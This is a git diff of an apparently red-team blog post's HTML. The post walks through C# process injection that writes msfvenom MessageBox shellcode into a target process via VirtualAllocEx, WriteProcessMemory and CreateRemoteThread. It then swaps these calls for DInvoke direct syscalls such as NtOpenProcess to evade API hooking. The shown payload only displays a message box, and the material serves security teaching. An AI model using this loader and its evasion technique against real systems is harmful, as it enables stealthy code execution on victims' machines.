+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x08</span>,<span style="color:#ae81ff">0x45</span>,<span style="color:#ae81ff">0x39</span>,<span style="color:#ae81ff">0xd1</span>,<span style="color:#ae81ff">0x75</span>,<span style="color:#ae81ff">0xd6</span>,<span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x44</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x40</span>,<span style="color:#ae81ff">0x24</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x66</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x0c</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x44</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x40</span>,<span style="color:#ae81ff">0x1c</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x3e</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x04</span>,<span style="color:#ae81ff">0x88</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0x5e</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x5a</span>,<span style="color:#ae81ff">0x41</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x5a</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0xec</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xe0</span>,<span style="color:#ae81ff">0x58</span>,<span style="color:#ae81ff">0x41</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x5a</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x12</span>,<span style="color:#ae81ff">0xe9</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x5d</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0xc7</span>,<span style="color:#ae81ff">0xc1</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x8d</span>,<span style="color:#ae81ff">0x95</span>,<span style="color:#ae81ff">0x1a</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x4c</span>,<span style="color:#ae81ff">0x8d</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x85</span>,<span style="color:#ae81ff">0x2b</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xc9</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0xba</span>,<span style="color:#ae81ff">0x45</span>,<span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0x56</span>,<span style="color:#ae81ff">0x07</span>,<span style="color:#ae81ff">0xff</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0xd5</span>,<span style="color:#ae81ff">0xbb</span>,<span style="color:#ae81ff">0xe0</span>,<span style="color:#ae81ff">0x1d</span>,<span style="color:#ae81ff">0x2a</span>,<span style="color:#ae81ff">0x0a</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0xba</span>,<span style="color:#ae81ff">0xa6</span>,<span style="color:#ae81ff">0x95</span>,<span style="color:#ae81ff">0xbd</span>,<span style="color:#ae81ff">0x9d</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xd5</span>,<span style="color:#ae81ff">0x48</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0xc4</span>,<span style="color:#ae81ff">0x28</span>,<span style="color:#ae81ff">0x3c</span>,<span style="color:#ae81ff">0x06</span>,<span style="color:#ae81ff">0x7c</span>,<span style="color:#ae81ff">0x0a</span>,<span style="color:#ae81ff">0x80</span>,<span style="color:#ae81ff">0xfb</span>,<span style="color:#ae81ff">0xe0</span>,<span style="color:#ae81ff">0x75</span>,<span style="color:#ae81ff">0x05</span>,<span style="color:#ae81ff">0xbb</span>,<span style="color:#ae81ff">0x47</span>,<span style="color:#ae81ff">0x13</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x6a</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x89</span>,<span style="color:#ae81ff">0xda</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xd5</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x6c</span>,<span style="color:#ae81ff">0x6c</span>,<span style="color:#ae81ff">0x6f</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x2c</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x66</span>,<span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x6d</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x4d</span>,<span style="color:#ae81ff">0x53</span>,<span style="color:#ae81ff">0x46</span>,<span style="color:#ae81ff">0x21</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x4d</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x73</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x61</span>,<span style="color:#ae81ff">0x67</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x42</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x78</span>,<span style="color:#ae81ff">0x00</span> };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">var</span> hProcess = OpenProcess(
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0x001F0FFF</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">int</span>.Parse(args[<span style="color:#ae81ff">0</span>]));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">var</span> hRegion = VirtualAllocEx(
+</span></span><span style="display:flex;"><span>                hProcess,
+</span></span><span style="display:flex;"><span>                IntPtr.Zero,
+</span></span><span style="display:flex;"><span>                (<span style="color:#66d9ef">uint</span>)_shellcode.Length,
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0x1000</span> | <span style="color:#ae81ff">0x2000</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0x04</span>); <span style="color:#75715e">// PAGE_READWRITE</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            WriteProcessMemory(
+</span></span><span style="display:flex;"><span>                hProcess,
+</span></span><span style="display:flex;"><span>                hRegion,
+</span></span><span style="display:flex;"><span>                _shellcode,
+</span></span><span style="display:flex;"><span>                (<span style="color:#66d9ef">uint</span>)_shellcode.Length,
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">out</span> UIntPtr _);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            VirtualProtectEx(
+</span></span><span style="display:flex;"><span>                hProcess,
+</span></span><span style="display:flex;"><span>                hRegion,
+</span></span><span style="display:flex;"><span>                (UIntPtr)_shellcode.Length,
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0x20</span>,  <span style="color:#75715e">// PAGE_EXECUTE_READ</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">out</span> <span style="color:#66d9ef">uint</span> _);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            CreateRemoteThread(
+</span></span><span style="display:flex;"><span>                hProcess,
+</span></span><span style="display:flex;"><span>                IntPtr.Zero,
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>                hRegion,
+</span></span><span style="display:flex;"><span>                IntPtr.Zero,
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>                IntPtr.Zero);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr OpenProcess(
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> dwDesiredAccess,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">bool</span> bInheritHandle,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> dwProcessId);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr VirtualAllocEx(
+</span></span><span style="display:flex;"><span>            IntPtr hProcess,
+</span></span><span style="display:flex;"><span>            IntPtr lpAddress,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">uint</span> dwSize,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">uint</span> flAllocationType,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">uint</span> flProtect);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">bool</span> WriteProcessMemory(
+</span></span><span style="display:flex;"><span>            IntPtr hProcess,
+</span></span><span style="display:flex;"><span>            IntPtr lpBaseAddress,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">byte</span>[] lpBuffer,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">uint</span> nSize,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">out</span> UIntPtr lpNumberOfBytesWritten);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">bool</span> VirtualProtectEx(
+</span></span><span style="display:flex;"><span>            IntPtr hProcess,
+</span></span><span style="display:flex;"><span>            IntPtr lpAddress,
+</span></span><span style="display:flex;"><span>            UIntPtr dwSize,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">uint</span> flNewProtect,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">out</span> <span style="color:#66d9ef">uint</span> lpflOldProtect);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr CreateRemoteThread(
+</span></span><span style="display:flex;"><span>            IntPtr hProcess,
+</span></span><span style="display:flex;"><span>            IntPtr lpThreadAttributes,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">uint</span> dwStackSize,
+</span></span><span style="display:flex;"><span>            IntPtr lpStartAddress,
+</span></span><span style="display:flex;"><span>            IntPtr lpParameter,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">uint</span> dwCreationFlags, IntPtr lpThreadId);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We shall now replace the standard P/Invoke with syscalls for each of these APIs.</p>
 <h3 id="getsyscallstub">GetSyscallStub</h3>
 <p>The first step is to replace the P/Invoke signatures with corresponding delegates targeting the Nt functions.  For instance, OpenProcess will be replaced with:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#a6e22e">[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
-<span style="color:#66d9ef">delegate</span> NTSTATUS NtOpenProcess(
-    <span style="color:#66d9ef">ref</span> IntPtr ProcessHandle,
-    <span style="color:#66d9ef">uint</span> DesiredAccess,
-    <span style="color:#66d9ef">ref</span> OBJECT_ATTRIBUTES ObjectAttributes,
-    <span style="color:#66d9ef">ref</span> CLIENT_ID ClientId);
-<span style="color:#a6e22e">                
-</span><span style="color:#a6e22e">[StructLayout(LayoutKind.Sequential, Pack = 0)]</span>
-<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">OBJECT_ATTRIBUTES</span>
-{
-    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> Length;
-    <span style="color:#66d9ef">public</span> IntPtr RootDirectory;
-    <span style="color:#66d9ef">public</span> IntPtr ObjectName;
-    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> Attributes;
-    <span style="color:#66d9ef">public</span> IntPtr SecurityDescriptor;
-    <span style="color:#66d9ef">public</span> IntPtr SecurityQualityOfService;
-}
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">[StructLayout(LayoutKind.Sequential)]</span>
-<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CLIENT_ID</span>
-{
-    <span style="color:#66d9ef">public</span> IntPtr UniqueProcess;
-    <span style="color:#66d9ef">public</span> IntPtr UniqueThread;
-}
-</code></pre></div><p>(<a href="https://github.com/TheWover/DInvoke/blob/main/DInvoke/DInvoke/SharedData/Native.cs">NTSTATUS</a> is a pretty big enum that I&rsquo;ve excluded for brevity).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#a6e22e">[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">delegate</span> NTSTATUS NtOpenProcess(
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">ref</span> IntPtr ProcessHandle,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint</span> DesiredAccess,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">ref</span> OBJECT_ATTRIBUTES ObjectAttributes,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">ref</span> CLIENT_ID ClientId);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">                
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">[StructLayout(LayoutKind.Sequential, Pack = 0)]</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">OBJECT_ATTRIBUTES</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> Length;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> IntPtr RootDirectory;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> IntPtr ObjectName;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> Attributes;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> IntPtr SecurityDescriptor;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> IntPtr SecurityQualityOfService;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">[StructLayout(LayoutKind.Sequential)]</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CLIENT_ID</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> IntPtr UniqueProcess;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> IntPtr UniqueThread;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>(<a href="https://github.com/TheWover/DInvoke/blob/main/DInvoke/DInvoke/SharedData/Native.cs">NTSTATUS</a> is a pretty big enum that I&rsquo;ve excluded for brevity).</p>
 <p>Next, get a pointer to the syscall:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">IntPtr stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtOpenProcess&#34;</span>);
-</code></pre></div><p><code>GetSyscallStub</code> only takes a <code>FunctionName</code> and not a target DLL, since syscalls only exist in <code>ntdll</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span>IntPtr stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtOpenProcess&#34;</span>);
+</span></span></code></pre></div><p><code>GetSyscallStub</code> only takes a <code>FunctionName</code> and not a target DLL, since syscalls only exist in <code>ntdll</code>.</p>
 <p>Marshal that pointer to the delegate:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">NtOpenProcess ntOpenProcess = (NtOpenProcess) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtOpenProcess));
-</code></pre></div><p>And then call the method:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">IntPtr hProcess = IntPtr.Zero;
-OBJECT_ATTRIBUTES oa = <span style="color:#66d9ef">new</span> OBJECT_ATTRIBUTES();
-
-CLIENT_ID ci = <span style="color:#66d9ef">new</span> CLIENT_ID
-{
-    UniqueProcess = (IntPtr)<span style="color:#66d9ef">uint</span>.Parse(args[<span style="color:#ae81ff">0</span>])
-};
-
-NTSTATUS result = ntOpenProcess(
-    <span style="color:#66d9ef">ref</span> hProcess,
-    <span style="color:#ae81ff">0</span>x001F0FFF,
-    <span style="color:#66d9ef">ref</span> oa,
-    <span style="color:#66d9ef">ref</span> ci);
-</code></pre></div><p>The return code should be Success and hProcess now contains a value.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">result
-Success
-
-hProcess
-<span style="color:#ae81ff">0</span>x00000000000003bc
-</code></pre></div><h3 id="final-code">Final Code</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">using</span> DInvoke.DynamicInvoke;
-
-<span style="color:#66d9ef">using</span> System;
-<span style="color:#66d9ef">using</span> System.Runtime.InteropServices;
-
-<span style="color:#66d9ef">namespace</span> ConsoleApp1
-{
-    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Program</span>
-    {
-        <span style="color:#75715e">// msfvenom -p windows/x64/messagebox EXITFUNC=thread -f csharp
-</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">readonly</span> <span style="color:#66d9ef">byte</span>[] _shellcode = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">323</span>] {
-            <span style="color:#ae81ff">0</span>xfc,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x81,<span style="color:#ae81ff">0</span>xe4,<span style="color:#ae81ff">0</span>xf0,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xe8,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x51,
-            <span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x50,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x51,<span style="color:#ae81ff">0</span>x56,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xd2,<span style="color:#ae81ff">0</span>x65,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x60,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,
-            <span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x18,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x72,<span style="color:#ae81ff">0</span>x50,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,
-            <span style="color:#ae81ff">0</span>x0f,<span style="color:#ae81ff">0</span>xb7,<span style="color:#ae81ff">0</span>x4a,<span style="color:#ae81ff">0</span>x4a,<span style="color:#ae81ff">0</span>x4d,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc0,<span style="color:#ae81ff">0</span>xac,<span style="color:#ae81ff">0</span>x3c,<span style="color:#ae81ff">0</span>x61,<span style="color:#ae81ff">0</span>x7c,<span style="color:#ae81ff">0</span>x02,
-            <span style="color:#ae81ff">0</span>x2c,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x0d,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>xe2,<span style="color:#ae81ff">0</span>xed,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x51,<span style="color:#ae81ff">0</span>x3e,
-            <span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x42,<span style="color:#ae81ff">0</span>x3c,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x80,<span style="color:#ae81ff">0</span>x88,
-            <span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x85,<span style="color:#ae81ff">0</span>xc0,<span style="color:#ae81ff">0</span>x74,<span style="color:#ae81ff">0</span>x6f,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x50,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x48,
-            <span style="color:#ae81ff">0</span>x18,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x44,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x40,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>xe3,<span style="color:#ae81ff">0</span>x5c,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x3e,
-            <span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x34,<span style="color:#ae81ff">0</span>x88,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd6,<span style="color:#ae81ff">0</span>x4d,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc0,<span style="color:#ae81ff">0</span>xac,<span style="color:#ae81ff">0</span>x41,
-            <span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x0d,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>x38,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x75,<span style="color:#ae81ff">0</span>xf1,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x4c,<span style="color:#ae81ff">0</span>x03,<span style="color:#ae81ff">0</span>x4c,<span style="color:#ae81ff">0</span>x24,
-            <span style="color:#ae81ff">0</span>x08,<span style="color:#ae81ff">0</span>x45,<span style="color:#ae81ff">0</span>x39,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>x75,<span style="color:#ae81ff">0</span>xd6,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x44,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x40,<span style="color:#ae81ff">0</span>x24,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,
-            <span style="color:#ae81ff">0</span>x66,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x0c,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x44,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x40,<span style="color:#ae81ff">0</span>x1c,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x3e,
